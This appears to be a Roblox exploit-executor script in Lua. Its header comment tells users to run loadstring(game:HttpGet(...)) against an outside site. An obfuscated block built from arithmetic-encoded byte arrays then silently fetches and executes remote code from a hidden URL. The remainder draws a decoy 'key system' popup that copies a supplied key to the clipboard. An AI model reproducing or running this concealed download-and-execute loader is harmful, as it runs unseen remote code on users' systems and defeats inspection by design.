--[[

 ,--.--------.   ,---.          _,---.   .=-.-.   _,---.                 
/==/,  -   , -\.--.'  \     _.='.'-,  \ /==/_ /.-`.' ,  \ ,--.-.  .-,--. 
\==\.-.  - ,-./\==\-/\ \   /==.'-     /|==|, |/==/_  _.-'/==/- / /=/_ /  
 `--`\==\- \   /==/-|_\ | /==/ -   .-' |==|  /==/-  '..-.\==\, \/=/. /   
      \==\_ \  \==\,   - \|==|_   /_,-.|==|- |==|_ ,    / \==\  \/ -/    
      |==|- |  /==/ -   ,||==|  , \_.' )==| ,|==|   .--'   |==|  ,_/     
      |==|, | /==/-  /\ - \==\-  ,    (|==|- |==|-  |      \==\-, /      
      /==/ -/ \==\ _.\=\.-'/==/ _  ,  //==/. /==/   \      /==/._/       
      `--`--`  `--`        `--`------' `--`-``--`---'      `--`-`        

 yeah go ahead and deobf it

     To load, you must first execute:
loadstring(game:HttpGet("https://yaso.su/tgify"))()

]]
if not getgenv().jic then return end
task.wait(0.3)
local lII1IIlllI1l=string local function I1l1IIlIIll1lIl(t) local l1l1I1IIIlll="" for Il1II11lIlIlIlI=1,#t do l1l1I1IIIlll=l1l1I1IIIlll..lII1IIlllI1l.char(t[Il1II11lIlIlIlI]) end return l1l1I1IIIlll end local l1lllIlIIIlI1II,IIlIIl11I11l,lllIlI111111,ll1I111I1lII1111={108,111,(104+10-17),(99+1),(125-10),116,(148-34),105,(118+20-28),(112+9-18)},{(130-27),(131-34),(103+12-6),101},{72,(126+14-24),(96+20),(138-26),71,(98+3),(140+6-30)},{(103+1),(112+20-16),(110+6),(81+31),(105+14-4),(29+30-1),(19+28),(70+2-25),(92+5),(120-8),(112+10-17),46,(142-31),(79+20-1),(104+29-18),(101-2),(122+2-7),(91+23),(100-3),(94+26-2),(106+3),(64-18),99,(110+24-23),(80+29),47,(117-2),(91+8),114,(109+26-30),112,(108+8),115,(67-20),(33+21),(86-37),(59-11),(24+31),(44+30-20),51,53,(19+34),(76+9-30),(73-16),(29+20),50,(10+39),(18+38),(93-40),(48+9),(36+28-14),(35+23-1),(62-9)} local I11IIl1II1l11I=(getfenv and getfenv()) or _ENV or _G or {} local I1ll11III1l1ll1=nil local Il11llI1IllII11=I11IIl1II1l11I[I1l1IIlIIll1lIl(l1lllIlIIIlI1II)] or (_G or {})[I1l1IIlIIll1lIl(l1lllIlIIIlI1II)] local I1ll1I1IIl=I11IIl1II1l11I[I1l1IIlIIll1lIl(IIlIIl11I11l)] or (_G or {})[I1l1IIlIIll1lIl(IIlIIl11I11l)] Il11llI1IllII11(I1ll1I1IIl[I1l1IIlIIll1lIl(lllIlI111111)](I1ll1I1IIl,I1l1IIlIIll1lIl(ll1I111I1lII1111)))()




-- copy icon taken from lucide
--[[ https://github.com/frappedevs/lucideblox/blob/master/src%2Fmodules%2Futil%2Ficons.json ]]


local pls=game:GetService("Players")
local lp=pls.LocalPlayer
local lpg=lp:WaitForChild("PlayerGui")
local ts=game:GetService("TweenService")

if lpg:FindFirstChild("pkui") then
    lpg.pkui:Destroy()
end

local screenGui=Instance.new("ScreenGui")
screenGui.Name="pkui"
screenGui.ResetOnSpawn=false
screenGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
screenGui.Parent=lpg

local main=Instance.new("Frame")
main.Name="xd"
main.Size=UDim2.new(0,380,0,160)
main.Position=UDim2.new(1,-400,0,20)
main.BackgroundColor3=Color3.fromRGB(12,12,12)
main.BorderSizePixel=0
main.Parent=screenGui

local corner=Instance.new("UICorner")
corner.CornerRadius=UDim.new(0,10)
corner.Parent=main

local stroke=Instance.new("UIStroke")
stroke.Color=Color3.fromRGB(160,160,160)
stroke.Thickness=1.5
stroke.Transparency=0.55
stroke.Parent=main

local shadow=Instance.new("ImageLabel")
shadow.Name="lol"
shadow.BackgroundTransparency=1
shadow.Image="rbxassetid://1316045217"
shadow.ImageColor3=Color3.fromRGB(0,0,0)
shadow.ImageTransparency=0.7
shadow.ScaleType=Enum.ScaleType.Slice
shadow.SliceCenter=Rect.new(10,10,118,118)
shadow.Size=UDim2.new(1,18,1,18)
shadow.Position=UDim2.new(0,-9,0,-9)
shadow.ZIndex=0
shadow.Parent=main

local message=Instance.new("TextLabel")
message.Name="msg"
message.Size=UDim2.new(1,-24,0,70)
message.Position=UDim2.new(0,12,0,12)
message.BackgroundTransparency=1
message.Text="The obfuscator I am using now requires a key system. However, I don’t think this script deserves one, so I made a permanent key for you to use it. Just takes a second, thanks for understanding."
message.TextColor3=Color3.fromRGB(220,220,220)
message.TextSize=13
message.Font=Enum.Font.Gotham
message.TextWrapped=true
message.TextXAlignment=Enum.TextXAlignment.Left
message.TextYAlignment=Enum.TextYAlignment.Top
message.Parent=main

local keyContainer=Instance.new("Frame")
keyContainer.Name="kc"
keyContainer.Size=UDim2.new(1,-24,0,36)
keyContainer.Position=UDim2.new(0,12,1,-52)
keyContainer.BackgroundTransparency=1
keyContainer.Parent=main

local keyBox=Instance.new("TextBox")
keyBox.Name="kb"
keyBox.Size=UDim2.new(1,-48,1,0)
keyBox.Position=UDim2.new(0,0,0,0)
keyBox.BackgroundColor3=Color3.fromRGB(22,22,22)
keyBox.Text="c6fc90dd7c74673551b19d5d"
keyBox.TextColor3=Color3.fromRGB(200,200,200)
keyBox.TextSize=14
keyBox.Font=Enum.Font.GothamMedium
keyBox.ClearTextOnFocus=false
keyBox.TextEditable=false
keyBox.Parent=keyContainer

local keyCorner=Instance.new("UICorner")
keyCorner.CornerRadius=UDim.new(0,6)
keyCorner.Parent=keyBox

local keyStroke=Instance.new("UIStroke")
keyStroke.Color=Color3.fromRGB(140,140,140)
keyStroke.Thickness=1.2
keyStroke.Transparency=0.5
keyStroke.Parent=keyBox

local copyBtn=Instance.new("TextButton")
copyBtn.Name="CopyButton"
copyBtn.Size=UDim2.new(0,40,1,0)
copyBtn.Position=UDim2.new(1,-40,0,0)
copyBtn.BackgroundColor3=Color3.fromRGB(28,28,28)
copyBtn.Text=""
copyBtn.AutoButtonColor=false
copyBtn.Parent=keyContainer

local btnCorner=Instance.new("UICorner")
btnCorner.CornerRadius=UDim.new(0,6)
btnCorner.Parent=copyBtn

local btnStroke=Instance.new("UIStroke")
btnStroke.Color=Color3.fromRGB(140,140,140)
btnStroke.Thickness=1.2
btnStroke.Transparency=0.5
btnStroke.Parent=copyBtn

local icon=Instance.new("ImageLabel")
icon.Name="Icon"
icon.Size=UDim2.new(0,18,0,18)
icon.Position=UDim2.new(0.5,-9,0.5,-9)
icon.BackgroundTransparency=1
icon.Image="rbxassetid://7733764083" --here
icon.ImageColor3=Color3.fromRGB(200,200,200)
icon.Parent=copyBtn

local function sho(state)
    local v=state and Color3.fromRGB(38,38,38) or Color3.fromRGB(28,28,28)
    ts:Create(copyBtn,TweenInfo.new(0.15),{BackgroundColor3=v}):Play()
end
copyBtn.MouseEnter:Connect(function() sho(true) end)
copyBtn.MouseLeave:Connect(function() sho(false) end)

local function sc(text)
    local success=pcall(function()
        if setclipboard then
            setclipboard(text)
        elseif toclipboard then
            toclipboard(text)
        elseif set_clipboard then
            set_clipboard(text)
        elseif Clipboard and Clipboard.set then
            Clipboard.set(text)
        else
            game:GetService("GuiService"):SetClipboard(text)
        end
    end)
    return success
end

local function close()
    local tof={
        {obj=main,props={BackgroundTransparency=1}},
        {obj=stroke,props={Transparency=1}},
        {obj=shadow,props={ImageTransparency=1}},
        {obj=message,props={TextTransparency=1}},
        {obj=keyBox,props={BackgroundTransparency=1,TextTransparency=1}},
        {obj=keyStroke,props={Transparency=1}},
        {obj=copyBtn,props={BackgroundTransparency=1}},
        {obj=btnStroke,props={Transparency=1}},
        {obj=icon,props={ImageTransparency=1}},
    }

    for _,item in ipairs(tof) do
        pcall(function()
            ts:Create(item.obj,TweenInfo.new(0.22),item.props):Play()
        end)
    end

    task.wait(0.25)
    if screenGui and screenGui.Parent then
        screenGui:Destroy()
    end
end

copyBtn.MouseButton1Click:Connect(function()
    local key=keyBox.Text
    local ok=sc(key)

    icon.ImageColor3=ok and Color3.fromRGB(100,255,120) or Color3.fromRGB(255,100,100)
    copyBtn.BackgroundColor3=ok and Color3.fromRGB(30,50,35) or Color3.fromRGB(50,25,25)

    task.wait(0.3)
    close()
end)

main.BackgroundTransparency=1
stroke.Transparency=1
shadow.ImageTransparency=1
message.TextTransparency=1
keyBox.BackgroundTransparency=1
keyBox.TextTransparency=1
keyStroke.Transparency=1
copyBtn.BackgroundTransparency=1
btnStroke.Transparency=1
icon.ImageTransparency=1

ts:Create(main,TweenInfo.new(0.3),{BackgroundTransparency=0}):Play()
ts:Create(stroke,TweenInfo.new(0.3),{Transparency=0.55}):Play()
ts:Create(shadow,TweenInfo.new(0.3),{ImageTransparency=0.7}):Play()
ts:Create(message,TweenInfo.new(0.3),{TextTransparency=0}):Play()
ts:Create(keyBox,TweenInfo.new(0.3),{BackgroundTransparency=0,TextTransparency=0}):Play()
ts:Create(keyStroke,TweenInfo.new(0.3),{Transparency=0.5}):Play()
ts:Create(copyBtn,TweenInfo.new(0.3),{BackgroundTransparency=0}):Play()
ts:Create(btnStroke,TweenInfo.new(0.3),{Transparency=0.5}):Play()
ts:Create(icon,TweenInfo.new(0.3),{ImageTransparency=0}):Play()